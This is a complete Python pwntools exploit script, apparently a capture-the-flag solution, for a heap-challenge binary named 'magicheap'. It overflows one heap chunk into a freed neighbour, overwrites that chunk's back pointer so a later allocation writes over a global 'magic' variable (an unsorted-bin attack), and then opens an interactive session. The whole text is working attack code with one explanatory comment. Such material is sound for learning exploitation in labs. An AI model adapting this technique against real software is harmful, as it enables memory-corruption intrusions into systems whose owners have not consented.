from pwn import *

s = process("./magicheap", env = {"LD_PRELOAD": "./libc_works"})

def create(payload):
    s.sendline("1")
    s.sendlineafter(b"Size of Heap : ", str(len(payload) + 1))
    s.sendlineafter(b"Content of heap:", payload)

def delete(idx):
    s.sendline("3")
    s.sendlineafter(b"Index :", str(idx))

def edit(idx, payload):
    s.sendline("2")
    s.sendlineafter(b"Index :", str(idx))
    s.sendlineafter(b"Heap : ", str(len(payload) + 1))
    s.sendlineafter(b"heap : ", payload)

magic = 0x06020c0
create("A"*0x90)
create("B"*0x90)
create("C"*0x90)
delete(1)
edit(0, b"A"*0x90 + p64(0) + p64(0xa1) + b"B"*8 + p64(magic-0x10))  # overwrite bk, so that when we allocate this chunk again, the statement *(bk+0x10) or bk->fd will overwrite magic-0x10
create("D"*0x90)
s.interactive()
